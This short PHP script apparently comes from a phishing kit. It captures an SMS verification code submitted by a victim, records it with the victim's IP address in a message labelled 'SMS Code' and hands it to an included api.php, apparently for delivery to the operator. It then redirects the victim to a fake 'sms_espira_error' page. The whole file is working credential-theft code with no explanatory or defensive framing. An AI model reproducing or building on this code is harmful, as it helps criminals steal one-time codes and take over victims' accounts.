<?php

session_start();



$smserror = $_SESSION['smserror'] = $_POST['smserror'];


$hexor = '
# SMS Code 📱
# Code : '.$_SESSION["smserror"].' 
# IP : '.$_SERVER['REMOTE_ADDR'].' 
';







include("api.php"); 



header('Location: ./sms_espira_error.php');


?>


